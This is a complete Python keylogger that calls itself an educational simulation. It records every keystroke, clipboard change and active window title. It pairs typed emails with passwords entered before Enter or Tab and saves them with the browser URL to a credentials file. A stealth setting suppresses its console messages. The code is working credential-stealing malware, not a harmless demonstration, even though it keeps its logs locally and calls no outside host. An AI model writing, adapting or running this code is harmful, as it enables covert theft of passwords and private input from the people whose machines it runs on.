import json
import logging
import os
import signal
import sys
import threading
import time
import re
from datetime import datetime
from pynput import keyboard
import pygetwindow as gw
import psutil
import pyperclip
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

# Configure error logging
logging.basicConfig(
    filename="keylog_errors.txt",
    level=logging.ERROR,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

class ConfigManager:
    """Manage configuration settings from a JSON file."""
    def __init__(self, config_file="config.json"):
        self.config_file = config_file
        self.config = self.load_config()

    def load_config(self):
        """Load configuration from JSON file."""
        default_config = {
            "log_file": "keylog_output.txt",
            "credential_file": "credentials.txt",
            "error_log_file": "keylog_errors.txt",
            "time_interval": 10,
            "max_log_size_mb": 5,
            "stealth_mode": False,
            "use_selenium": False
        }
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, "r") as f:
                    config = json.load(f)
                default_config.update(config)
            with open(self.config_file, "w") as f:
                json.dump(default_config, f, indent=4)
            return default_config
        except Exception as e:
            logging.error(f"Config load error: {e}")
            return default_config

class LogRotator:
    """Handle log file rotation based on size."""
    def __init__(self, log_file, max_size_mb):
        self.log_file = log_file
        self.max_size_mb = max_size_mb * 1024 * 1024

    def rotate_log(self):
        """Rotate log file if it exceeds max size."""
        try:
            if os.path.exists(self.log_file) and os.path.getsize(self.log_file) > self.max_size_mb:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                os.rename(self.log_file, f"{self.log_file}.{timestamp}.bak")
        except Exception as e:
            logging.error(f"Log rotation error: {e}")

class KeyLogger:
    """Advanced keylogger simulation for educational purposes."""
    def __init__(self, config):
        self.text = ""
        self.lock = threading.Lock()
        self.timer = None
        self.config = config
        self.log_rotator = LogRotator(self.config["log_file"], self.config["max_log_size_mb"])
        self.cred_rotator = LogRotator(self.config["credential_file"], self.config["max_log_size_mb"])
        self.running = True
        self.last_clipboard = pyperclip.paste()
        self.email_buffer = None
        self.password_buffer = None
        self.driver = None
        if self.config["use_selenium"] and SELENIUM_AVAILABLE:
            self.setup_selenium()

    def setup_selenium(self):
        """Initialize Selenium for URL detection."""
        try:
            options = Options()
            options.headless = True
            self.driver = webdriver.Chrome(options=options)
        except Exception as e:
            logging.error(f"Selenium setup error: {e}")
            self.config["use_selenium"] = False

    def get_browser_url(self, process_name):
        """Attempt to get the URL from the active browser."""
        try:
            window = gw.getActiveWindow()
            title = window.title if window else "Unknown"
            if not self.config["use_selenium"] or not SELENIUM_AVAILABLE:
                # Fallback: Infer website from window title
                if "chrome" in process_name.lower() or "brave" in process_name.lower():
                    return title.split(" - ")[0] if " - " in title else "Unknown"
                elif "firefox" in process_name.lower():
                    return title.split(" — ")[0] if " — " in title else "Unknown"
                return "Unknown"
            else:
                # Use Selenium for precise URL
                if "chrome" in process_name.lower():
                    self.driver.switch_to.window(self.driver.current_window_handle)
                    return self.driver.current_url
                return "Unknown"
        except Exception as e:
            logging.error(f"URL retrieval error: {e}")
            return "Unknown"

    def get_window_title(self):
        """Get active window title."""
        try:
            window = gw.getActiveWindow()
            return window.title if window else "Unknown"
        except Exception as e:
            logging.error(f"Window title retrieval error: {e}")
            return "Unknown"

    def get_context(self):
        """Get URL for credential logging."""
        try:
            window = gw.getActiveWindow()
            hwnd = window._hWnd if window else 0
            pid = psutil.win32pdh.get_owning_pid(hwnd) if hwnd else 0
            if pid:
                process = psutil.Process(pid)
                process_name = process.name().lower()
                url = self.get_browser_url(process_name) if "chrome" in process_name or "firefox" in process_name or "brave" in process_name else "Unknown"
                return {"url": url}
            return {"url": "Unknown"}
        except Exception as e:
            logging.error(f"Context retrieval error: {e}")
            return {"url": "Unknown"}

    def check_clipboard(self):
        """Check for clipboard changes (e.g., Ctrl+C)."""
        try:
            current_clipboard = pyperclip.paste()
            if current_clipboard != self.last_clipboard and current_clipboard:
                self.last_clipboard = current_clipboard
                with self.lock:
                    self.text += f"[CLIPBOARD:{current_clipboard}]"
                    if self.is_email(current_clipboard):
                        self.email_buffer = current_clipboard
        except Exception as e:
            logging.error(f"Clipboard check error: {e}")

    def is_email(self, text):
        """Check if text matches an email pattern."""
        email_pattern = r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"
        return re.match(email_pattern, text.strip())

    def log_credentials(self, email, password, context):
        """Log email and password to a separate file."""
        try:
            self.cred_rotator.rotate_log()
            cred_entry = {
                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                "email": email,
                "password": password,
                "context": context
            }
            with open(self.config["credential_file"], "a", encoding="utf-8") as f:
                f.write(json.dumps(cred_entry, ensure_ascii=False) + "\n")
        except Exception as e:
            logging.error(f"Credential log error: {e}")

    def write_to_file(self):
        """Write captured text to a local file periodically."""
        try:
            self.log_rotator.rotate_log()
            with self.lock:
                if self.text:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    window = self.get_window_title()
                    log_entry = {
                        "timestamp": timestamp,
                        "window": window,
                        "keystrokes": self.text
                    }
                    with open(self.config["log_file"], "a", encoding="utf-8") as f:
                        f.write(json.dumps(log_entry, ensure_ascii=False) + "\n")
                    # Check for email/password pairs
                    cleaned_text = re.sub(r"\[.*?\]", "", self.text).strip()
                    if self.email_buffer:
                        if "[ENTER]" in self.text or "[TAB]" in self.text:
                            self.password_buffer = cleaned_text
                            self.log_credentials(self.email_buffer, self.password_buffer, self.get_context())
                            self.email_buffer = None
                            self.password_buffer = None
                    elif self.is_email(cleaned_text):
                        self.email_buffer = cleaned_text
                    self.text = ""
            if self.running:
                self.timer = threading.Timer(self.config["time_interval"], self.write_to_file)
                self.timer.start()
        except Exception as e:
            logging.error(f"File write error: {e}")

    def on_press(self, key):
        """Handle keypress events."""
        special_keys = {
            keyboard.Key.enter: "[ENTER]\n",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.space: " ",
            keyboard.Key.shift: "",
            keyboard.Key.shift_r: "",
            keyboard.Key.backspace: "[BACKSPACE]",
            keyboard.Key.ctrl_l: "[CTRL_L]",
            keyboard.Key.ctrl_r: "[CTRL_R]",
            keyboard.Key.alt_l: "[ALT_L]",
            keyboard.Key.alt_r: "[ALT_R]",
            keyboard.Key.esc: "[ESC]",
            keyboard.Key.delete: "[DELETE]",
            keyboard.Key.up: "[UP]",
            keyboard.Key.down: "[DOWN]",
            keyboard.Key.left: "[LEFT]",
            keyboard.Key.right: "[RIGHT]",
            keyboard.Key.f1: "[F1]",
            keyboard.Key.f2: "[F2]",
            keyboard.Key.f3: "[F3]",
            keyboard.Key.f4: "[F4]",
            keyboard.Key.f5: "[F5]",
            keyboard.Key.f6: "[F6]",
            keyboard.Key.f7: "[F7]",
            keyboard.Key.f8: "[F8]",
            keyboard.Key.f9: "[F9]",
            keyboard.Key.f10: "[F10]",
            keyboard.Key.f11: "[F11]",
            keyboard.Key.f12: "[F12]",
            keyboard.Key.cmd: "[CMD]"
        }

        with self.lock:
            if key in special_keys:
                key_value = special_keys[key]
            else:
                key_value = str(key).strip("'").replace("Key.", "")

            if key == keyboard.Key.backspace:
                self.text = self.text[:-1] if self.text else ""
                self.text += key_value
            elif key == keyboard.Key.esc:
                self.text += key_value
                self.running = False
                return False
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                self.check_clipboard()
                self.text += key_value
            else:
                self.text += key_value

        return True

    def start(self):
        """Start the keylogger simulation."""
        if not self.config["stealth_mode"]:
            print("Starting advanced keylogger simulation. Press Esc to stop.")
        signal.signal(signal.SIGINT, self.signal_handler)
        self.write_to_file()
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
        self.cleanup()

    def signal_handler(self, sig, frame):
        """Handle script termination."""
        self.running = False
        self.cleanup()
        if not self.config["stealth_mode"]:
            print("Keylogger stopped.")
        sys.exit(0)

    def cleanup(self):
        """Clean up resources on exit."""
        if self.timer:
            self.timer.cancel()
            self.timer = None
        if self.driver:
            self.driver.quit()

def main():
    """Main entry point."""
    config_manager = ConfigManager()
    keylogger = KeyLogger(config_manager.config)
    keylogger.start()

if __name__ == "__main__":
    main()